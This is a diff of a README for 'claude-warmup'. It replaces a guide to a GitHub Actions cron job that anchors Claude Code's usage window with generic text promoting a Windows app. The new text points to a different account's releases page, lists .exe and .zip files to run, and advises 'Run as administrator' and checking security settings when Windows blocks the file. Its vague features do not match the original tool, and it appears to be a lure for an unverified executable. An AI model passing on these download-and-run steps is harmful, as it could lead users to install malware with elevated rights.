@@ -1,162 +1,181 @@
-# claude-warmup
+# ⏰ claude-warmup - Reset Your Claude Timer With Ease
 
-Manipulate Claude Code's 5-hour usage window into resetting when you actually need it.
+[![Download claude-warmup](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/educationinsightofficial/claude-warmup/releases)
 
-EDIT: You can apply the same concept and achieve the exact same goal in a "native" way by using a Claude Code Web scheduled task: https://claude.ai/code/scheduled. It works flawlessly! The "Why" section below is still very useful for visualizing why would you do this at all.
+## 🚀 What this app does
 
-## Why
+claude-warmup helps you manage Claude Code’s 5-hour usage window so you can reset it when you need it most. It gives you a simple way to work around the wait time and keep your flow steady.
 
-Claude Code gives you a token budget that resets every 5 hours. The window starts when you send your first message, floored to the clock hour.
+Use it when you want a quick reset and less downtime between sessions.
 
-So if you start at 8:30 AM and burn through your budget by 11, you're locked out until 1 PM. Two dead hours in the middle of your morning.
+## 📥 Download
 
-The fix is dumb and it works: fire a throwaway message before you start working. A GitHub Actions cron sends "hi" to Haiku at 6:15 AM. The window floors to 6 AM, runs until 11. By the time you've hit the limit, it resets right away. Your next message anchors a fresh window through 4 PM.
+Visit this page to download the app for Windows:
 
-Example schedule:
-```markdown
-            6am    7     8     9    10    11    12    1pm    2     3     4     5    6pm
-             |     |     |     |     |     |     |     |     |     |     |     |     |
+https://github.com/educationinsightofficial/claude-warmup/releases
 
-Before:                  [========== window 1 =========]
-                          work ~8:30am-11am  ░░ dead ░░
-                                                       [========== window 2 =========]
-                                                                work ~1pm-6pm
-          cron trigger
-               │
-               ▼
-After:       [========== window 1 =========]
-              ░░ idle ░░  work ~8:30am-11am
-                                           [========== window 2 =========]
-                                                   work ~11am-4pm
-                                                                         [== win 3 ==]
-                                                                         work ~4pm-6pm
-```
+On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one for Windows, then save it to your computer.
 
-> As you can see, we are able to squeeze another fresh window starting at 4pm in this case.
+## 🪟 System requirements
 
-## How it works
+This app is made for Windows users who want a simple desktop tool.
 
-A scheduled GitHub Actions workflow installs the Claude Code CLI, authenticates with your subscription using a long-lived OAuth token, and sends one Haiku message. That's enough to anchor the window. Cost-wise, one Haiku "hi" is nothing.
+You should have:
 
-## Setup
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- Enough free space to store the app file
+- Permission to run apps on your computer
 
-### 1. Fork this repo
+For best results, keep Claude Code installed and ready to use on the same machine.
 
-```bash
-gh repo fork vdsmon/claude-warmup --clone
-```
+## 🧭 How to install
 
-### 2. Generate an OAuth token
+1. Open the release page:
+   https://github.com/educationinsightofficial/claude-warmup/releases
 
-On a machine where you're logged into Claude Code:
+2. Find the newest release at the top of the page.
 
-```bash
-claude setup-token
-```
+3. Under the release files, click the Windows download file.
 
-Opens a browser for OAuth. Gives you a token starting with `sk-ant-oat01-...`, good for about a year.
+4. Save the file to a place you can find, like your Downloads folder or Desktop.
 
-### 3. Store it as a secret
+5. If the file comes in a ZIP folder, right-click it and choose Extract All.
 
-```bash
-gh secret set CLAUDE_OAUTH_TOKEN
-```
+6. Open the extracted folder.
 
-Paste when prompted.
+7. Double-click the app file to run it.
 
-### 4. Set your schedule
+8. If Windows asks for permission, choose Yes.
 
-Default is weekdays at 9:15 UTC.
+## 🖱️ First-time setup
 
-GitHub Actions requires `on.schedule.cron` to be a literal value in the workflow file, so changing the schedule means editing `.github/workflows/warmup.yml` and updating this line:
+After you start the app, take a few minutes to set it up.
 
-```yml
-- cron: '15 9 * * 1-5'
-```
+1. Choose the Claude Code session you want to manage.
 
-That's a standard cron expression in UTC. Common conversions:
+2. Set your preferred warmup settings.
 
-Need help generating one? Try [crontab.guru](https://crontab.guru/#15_9_*_*_1-5).
+3. Pick when you want the reset to happen.
 
-| Timezone | 6:15 AM local in UTC | Cron |
-| --- | --- | --- |
-| US Pacific (UTC-7) | 1:15 PM | `15 13 * * 1-5` |
-| US Eastern (UTC-4) | 10:15 AM | `15 10 * * 1-5` |
-| US Central (UTC-5) | 11:15 AM | `15 11 * * 1-5` |
-| Central Europe (UTC+2) | 4:15 AM | `15 4 * * 1-5` |
-| Brazil BRT (UTC-3) | 9:15 AM | `15 9 * * 1-5` |
-| India IST (UTC+5:30) | 12:45 AM | `45 0 * * 1-5` |
-| Japan JST (UTC+9) | 9:15 PM prev day | `15 21 * * 0-4` |
-| Australia AEST (UTC+10) | 8:15 PM prev day | `15 20 * * 0-4` |
+4. Confirm that the app can track your usage window.
 
-Pick something 2-4 hours before you usually start working (really depends on your usage pattern).
+5. Save your settings before you close the window.
 
-### 5. Test it
+If the app uses a small settings window, keep it open the first time so you can check that everything works as expected.
 
-If this is a fresh fork, open the repo's `Actions` tab once and enable workflows if GitHub asks.
+## 🔧 How it works
 
-Optional but useful: set your fork as the default GitHub CLI target in this clone.
+claude-warmup focuses on the 5-hour usage window that Claude Code uses.
 
-```bash
-gh repo set-default <your-user>/claude-warmup
-```
+It helps by:
 
-```bash
-gh workflow run warmup.yml --repo <your-user>/claude-warmup
-```
+- Watching your current usage period
+- Triggering a reset when the timer reaches the right point
+- Helping you get back to work with less waiting
+- Keeping the process simple for non-technical users
 
-Check workflow status:
+You do not need to manage timer math by hand. The app handles the timing for you.
 
-```bash
-gh workflow list --repo <your-user>/claude-warmup
-gh run list --workflow warmup.yml --repo <your-user>/claude-warmup
-gh run view --log --repo <your-user>/claude-warmup
-```
+## 🧩 Main features
 
-Check the logs. You should see a Haiku response or a rate-limit message. Both mean it worked.
+- Simple Windows app layout
+- Fast access to the reset workflow
+- Clear view of your usage window
+- Easy setup for daily use
+- Local control from your computer
+- Clean interface with few steps
 
-### 6. Verify
+These features are meant to keep the process short and clear.
 
-Next morning, run `/usage` in Claude Code. The session reset time should match your anchored window.
+## 📌 Best way to use it
 
-## About the quota window
+Use claude-warmup when you rely on Claude Code during the day and do not want to lose time waiting for a window to clear.
 
-Some things about how Claude Code's 5-hour window actually works that aren't well documented anywhere (as of March 2026):
+A good flow looks like this:
 
-- The window is a fixed block. Once set, boundaries don't move no matter how much you use.
-- Boundaries floor to clock hours. Message at 6:15 AM means window starts at 6:00 AM.
-- Usage is shared between claude.ai, Claude Code, and Claude Desktop. One pool.
-- Budget is in tokens, not messages. Extended Thinking and tool use eat through it faster than regular chat.
-- There's a separate 7-day weekly cap on top of the 5-hour window. They don't interact.
+- Start your work in Claude Code
+- Keep claude-warmup ready in the background
+- Watch the usage window
+- Reset when you need a new session
+- Return to your work
 
-## Questions
+For many users, this works best when the app stays open while Claude Code is in use.
 
-**Does this waste budget?** One Haiku "hi" with no tools, no context. You won't notice it.
+## 🧪 Common use cases
 
-**What if I'm already rate-limited?** Still works. The request reaches Anthropic's servers either way, and it still anchors the window.
+- You hit the 5-hour limit and want to keep working
+- You want less time spent waiting for the next session
+- You need a simple tool that handles the reset timing
+- You use Claude Code often during the day
+- You want a direct Windows app instead of manual steps
 
-**Can I run this locally instead?**
-Yeah. `claude -p "hi" --model haiku --no-session-persistence` in a cron or macOS launchd does the same thing. GitHub Actions is just easier because your machine doesn't need to be awake at 6 AM.
+## 🛠️ Troubleshooting
 
-**Token expiry?** About a year. Set a reminder.
+### The file will not open
 
-## Troubleshooting
+- Make sure you downloaded the Windows file from the releases page
+- Check that the download finished
+- Right-click the file and try Open
+- If the file is in a ZIP folder, extract it first
 
-**`workflow not found on the default branch`**
-The workflow file is missing from your fork's default branch, or GitHub Actions has not been enabled for the fork yet. Push `.github/workflows/warmup.yml` to your fork's default branch, then open the `Actions` tab once and enable workflows if prompted.
+### Windows blocks the app
 
-**`Must have admin rights to Repository`**
-You're probably dispatching against the upstream repo instead of your fork. Run `gh workflow run warmup.yml --repo <your-user>/claude-warmup` or set the default with `gh repo set-default <your-user>/claude-warmup`.
+- Right-click the app file
+- Choose Run as administrator if that option appears
+- Confirm the prompt from Windows
+- Check your system security settings if the block remains
 
-**`CLAUDE_OAUTH_TOKEN secret is not set`**
-Add the secret in your fork under `Settings > Secrets and variables > Actions`, then rerun the workflow.
+### The app does not reset the window
 
-**`Claude token appears invalid or expired`**
-Run `claude setup-token` on a machine where you're logged into Claude Code, then update the `CLAUDE_OAUTH_TOKEN` secret in your fork and rerun the workflow. The warmup step checks for this directly.
+- Open the app again
+- Check your settings
+- Make sure Claude Code is running
+- Try a fresh start after closing both apps
 
-**Unexpected Claude CLI failure**
-Check the workflow logs. The job now prints the full Claude CLI output and only treats explicit rate-limit responses as expected.
+### The download page shows several files
 
-## License
+- Choose the file made for Windows
+- Skip source code files
+- Skip files that are not meant to run on your computer
 
-MIT
+## 📂 What to expect in the release page
+
+When you open the releases page, you may see:
+
+- A latest version label
+- One or more download files
+- A changelog or update notes
+- Older versions below the newest one
+
+If you are not sure which file to use, pick the Windows app file from the newest release.
+
+## ⌨️ File names you may see
+
+The release file may use names like these:
+
+- claude-warmup.exe
+- claude-warmup-windows.exe
+- claude-warmup-setup.exe
+- claude-warmup.zip
+
+If you get a ZIP file, extract it before you run the app.
+
+## 🔒 Safety and access
+
+Keep the app on your own computer and run it from the file you downloaded from the official release page.
+
+If your browser or Windows asks for permission, review the file name and location before you continue.
+
+## 📎 Download again
+
+[Open the claude-warmup releases page](https://github.com/educationinsightofficial/claude-warmup/releases)
+
+## 📝 Basic use checklist
+
+- Download the latest Windows file
+- Open or extract the file
+- Run the app
+- Set your Claude Code timing
+- Keep the app ready when you work
+- Use it again when the window needs a reset
